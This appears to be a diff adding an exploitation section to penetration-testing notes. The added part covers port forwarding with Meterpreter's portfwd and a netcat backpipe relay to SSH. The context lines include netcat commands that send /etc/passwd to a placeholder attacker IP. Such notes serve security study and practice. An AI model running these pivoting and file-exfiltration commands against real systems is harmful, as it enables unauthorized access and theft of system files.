@@ -62,6 +62,30 @@ nc -nvlp 8080 < /etc/passwd
 nc -nv YOUR_LINUX_IP_ADDRESS 8080 > passwd.txt
 ```
 
+# Chapter 3 Exploitation
+
+## Port forwarding
+
+#### Meterpreter   
+```
+meterpreter > portfwd add -l 1111 -p 22 -r Target2
+```
+This opens 1111 on attackers machine then send anything to port 22 on target machine through meterpreter
+
+#### Netcat backpipe
+```
+mknod backpipe p
+
+nc -lp 9000 0<backpipe | nc 127.0.0.1 22 1>backpipe
+```
+
+ssh to connet 
+```
+ssh login_name@targetmachine -p 9000
+```
+
+
+
 # Chapter 5
 
 ## Kerberoasting
